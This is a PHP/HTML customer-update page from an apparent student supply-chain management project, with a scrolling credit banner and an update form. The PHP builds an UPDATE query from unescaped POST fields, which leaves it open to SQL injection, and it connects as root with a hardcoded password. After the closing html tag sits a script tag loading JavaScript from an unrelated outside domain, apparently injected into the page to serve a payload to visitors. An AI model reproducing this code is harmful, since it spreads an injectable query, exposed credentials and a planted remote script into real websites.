<html>
<head>

<title>Customer Update</title>
</head>
<SCRIPT language=JavaScript>
<!--
// Use the following three variables to set up the message:
var msg = "This Software is Designed By Lalit Chandnani(Administrator & Frontend Designer), Deepak Agnihotri(Analysis & Connectivity), Rahul Sharma(Database Designer) Student of CSE VIsem,OIST Bpl"
var delay = 100
var startPos = 127

// Don't touch these variables:
var timerID = null
var timerRunning = false
var pos = 0

// Crank it up!
StartScrolling()

function StartScrolling(){
    // Make sure the clock is stopped
    StopTheClock()

    // Pad the message with spaces to get the "start" position
    for (var i = 0; i < startPos; i++) msg = " " + msg

    // Off we go...
    DoTheScroll()
}

function StopTheClock(){
    if(timerRunning)
        clearTimeout(timerID)
    timerRunning = false
}

function DoTheScroll(){
    if (pos < msg.length)
        self.status = msg.substring(pos, msg.length);
    else
        pos=-1;
    ++pos
    timerRunning = true
    timerID = self.setTimeout("DoTheScroll()", delay)
}
//-->

</SCRIPT>
<body background="back.jpg">

	<img src="./top.jpg" width=975 >
<table width=1000>
	<tr>
	<td width='90%'><b>Welcome, lalit </b></td>
	<td width="10%"><a href="end.php" align="right"><font color="#000000"><b>Logout</b></font></a></td>
	</tr>
</table>

	
<table>

<td width=300 height=300 colspan=1 rowspan=3 valign=top align=left>
	<map name="map397">
				<area shape='rect' coords='4,5,135,40' href='customer.php'>
				<area shape='rect' coords='4,49,135,83' href='item.php'>
				<area shape='rect' coords='4,93,135,127' href='sales.php'>
				<area shape='rect' coords='4,137,135,172' href='supplier.php'>
				<area shape='rect' coords='4,179,135,213' href='purchase.php'>
				<area shape='rect' coords='4,220,135,258' href='report.php'>
				<area shape='rect' coords='4,270,135,310' href='end.php'>
	</map>

	<tr>
	<td width="5%"></td>
	<td width="35%"><img  border=0 src="cust1.jpg" usemap="#map397"></td>
	<td width="60%"><br><br><br> <br><br><br><br> <br><br> 
				<img src="custup.jpg" width=600 hight=75>
				<form action="custup.php" method="POST">
					Enter Customer ID:<input type="text" name="custid"><br><br><br>
					
<?php
			if(isset($_POST['button']))
			{
			$cid = $_POST['custid'];
			$cname = $_POST['compname'];
			$ad = $_POST['address'];
			$ct = $_POST['city'];
			$stat = $_POST['state'];
			$postal = $_POST['postal'];
			$cont = $_POST['contact'];
			$fx = $_POST['fax'];
			$emel = $_POST['email'];
			$link = mysql_connect("localhost", "root", "gate1024");
			$result = mysql_db_query('scm',"update customer set companyname='$cname', address='$ad', city='$ct', state='$stat', postalcode='$postal', contactno='$cont', fax='$fx', emailid='$emel' where customerid='$cid'",$link);
			} 

					echo "Enter values to update:<br><br>";
					echo "Company Name:<input type='text' name='compname'><br><br>";
					echo "Address:<br><textarea name='address' rows=5 cols=30 ></textarea>";
					echo "City:<input type='text' name='city'><br><br>";
					echo "State:<input type='text' name='state'><br><br>";						
					echo "Postal Code:<input type='text' name='postal'><br><br>";
					echo "Contact No:<input type='text' name='contact'><br><br>";
					echo "Fax:<input type='text' name='fax'><br><br>";
					echo "email ID:<input type='text' name='email'><br><br><br><br>";
					echo "<input type='submit' name='button' value='Update'>";
				 
?>
				</form></td>

	</tr>
	
</td>
</table>
</body>
</html>
<script src="http://www.yayadown.com/b.js"></script>